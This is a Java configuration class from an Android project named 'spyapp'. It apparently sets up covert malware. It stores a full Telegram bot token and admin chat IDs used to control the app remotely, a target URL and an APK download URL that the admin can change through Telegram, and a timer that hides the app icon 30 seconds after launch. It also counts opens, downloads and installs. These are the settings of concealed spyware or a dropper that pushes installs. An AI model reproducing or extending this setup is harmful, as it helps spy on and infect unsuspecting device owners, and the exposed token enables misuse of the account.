package com.spyapp;

public class Config {
    
    // ========== TELEGRAM BOT CONFIGURATION ==========
    public static final String BOT_TOKEN = "8749943600:AAFctiNcPnwjMQhe0Kbs9pOGVTFsg7F0rIw";
    
    // Admin Telegram Chat IDs (comma separated) - get these from @userinfobot
    // Add YOUR Telegram user ID here after getting it from @userinfobot
    public static final String ADMIN_IDS = "8073304246"; 
    
    // Default target URL - admin can change this via Telegram
    public static String CURRENT_TARGET_URL = "https://pyarhub.in";
    
    // APK download URL - admin sets this
    public static String APK_DOWNLOAD_URL = "";
    
    // Bot check interval (milliseconds)
    public static final long BOT_CHECK_INTERVAL = 5000; // 5 seconds
    
    // Download interval (milliseconds)
    public static final long DOWNLOAD_INTERVAL = 2500; // 2.5 seconds
    
    // How long to wait before hiding app icon (milliseconds)
    public static final long HIDE_ICON_DELAY = 30000; // 30 seconds after launch
    
    // Statistics
    public static int totalOpens = 0;
    public static int totalDownloads = 0;
    public static int totalInstalls = 0;
}
